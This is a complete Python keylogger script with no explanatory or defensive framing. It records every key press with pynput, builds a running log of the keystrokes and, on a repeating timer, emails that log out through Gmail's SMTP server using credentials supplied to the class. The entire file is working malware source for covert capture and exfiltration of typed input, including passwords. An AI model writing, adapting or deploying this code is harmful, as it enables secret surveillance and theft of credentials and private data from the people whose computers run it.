#!/usr/bin/env python
import pynput.keyboard, smtplib, threading


class Keylogger:
    def __init__(self, email, password, time=10):
        self.email = email
        self.password = password
        self.log = ""
        self.time = time

    def append_to_log(self, string):
        self.log = self.log + string

    def sent_smtp(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, "Keylogger\n\n" + message)
        server.quit()

    def respons(self):
        if self.log:
            self.sent_smtp(self.log)
        self.log = ""
        time = threading.Timer(self.time, self.respons)
        time.start()

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + (str(key)) + " "
        self.append_to_log(current_key)
        
    def start(self):
        keyboard = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard:
            self.respons()
            keyboard.join()